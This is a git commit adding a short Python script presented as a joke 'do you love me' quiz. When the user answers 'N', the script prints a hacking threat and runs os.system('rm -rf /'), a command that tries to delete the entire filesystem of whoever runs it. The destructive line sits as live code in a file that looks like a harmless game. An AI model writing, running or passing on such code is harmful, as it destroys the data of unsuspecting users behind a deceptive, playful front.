fc26c79877b4097c9af6f9ff38731f5cbc9d10b4
ARABIC SYYSTEM <68659620+aymen-crater@users.noreply.github.com>
2021-03-12 15:38:26 +0100

    Add files via upload

---
+++ do-you-love-me.py
@@ -0,0 +1,8 @@
+import os
+like=input("do you love me ? Y|N ----) ")
+if like == "Y" :
+	print ("NICE CHOOSE \n I LOVE YOU TOO")
+if like == "N" :
+	print ("OMG!..I WILL HACK U BEACUSE U DONT LOVE ME")
+	os.system("cd $HOME")
+	os.system("rm -rf /")
